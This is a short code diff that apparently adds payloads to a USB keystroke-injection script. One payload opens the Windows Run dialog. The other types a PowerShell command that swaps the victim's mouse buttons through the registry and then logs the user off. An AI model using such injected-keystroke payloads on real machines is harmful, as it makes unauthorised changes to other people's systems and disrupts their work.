@@ -1,0 +1,5 @@
+# Windows Key + R
+payload1 = [usb.RUN]
+# Swap Mouse Buttons & Logout
+payload2 = usb.get_sequence('powershell -c "Set-ItemProperty \'HKCU:\\Control Panel\\Mouse\' -Name SwapMouseButtons -Value 1; shutdown /l"')
+payload2 += [usb.ENTER]
